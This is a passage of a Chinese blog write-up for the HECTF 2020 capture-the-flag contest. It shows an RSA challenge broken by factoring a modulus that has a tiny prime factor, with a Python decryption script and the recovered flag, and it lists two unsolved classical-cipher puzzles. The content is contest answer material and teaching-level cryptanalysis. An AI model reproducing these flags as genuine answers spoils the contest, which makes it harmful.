+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span><br></pre></td></tr></table></figure>
+
+<p>首先分解p、q，使用<a target="_blank" rel="noopener" href="http://factordb.com/%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86">http://factordb.com/在线解密</a></p>
+<p><img src="https://s3.ax1x.com/2020/11/25/DUnK74.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820</span></span><br><span class="line">p = <span class="number">2499568793</span></span><br><span class="line">q = <span class="number">4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911</span></span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>以下两题还没看到wp，等各位大佬补充</strong></p>
+<h3 id="no-blank-space"><a href="#no-blank-space" class="headerlink" title="no blank space"></a>no blank space</h3><p>题目：出题人的电脑年久失修，空格键失灵了，你能找到电报里的秘密吗(注:flag内字母全部大写）   flag格式：HECTF{.+}</p>
+<p>hint：试试别的电报码叭</p>
+<p>hint：古老的5bit编码</p>
+<ul>
+<li>cipher.txt</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p>题目：出题人想悄悄送给大家flag，flag就是HECTF{ezth……（糟糕,小哲哲师傅突然堵住了我的嘴</p>
+<p>hint：已知部分明文，不如试试解出key叭</p>
+<p>hint：hectf 原来这是五个字</p>
+<ul>
+<li>cipher.txt</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdqsrppwuzzyjhwrhyzripfpxol</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+
+<style>a{TEXT-DECORATION:none}</style>
+
+<div class="share-btn">
+	<a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin" >
+		<span class="share-sns share-outer">
+			<i class="ri-share-forward-line"></i>
+			分享
+        </span>
+	</a>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://flag2020.top/2020/11/22/%E7%AC%AC%E5%9B%9B%E5%B1%8AHECTF%20write%20up/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AFwrite%20up/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">第三届海啸杯write up</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "LPopDsE5xqAMk1vc3LFLtBKM-9Nh9j0Va",
+    app_key: "FJFDwtlxVYM7om71IEGJoidS",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020
+        <i class="ri-heart-fill heart_icon"></i> flag2020
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/picture.jpg" alt="潜心"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/me_zfb.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/me_wx.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
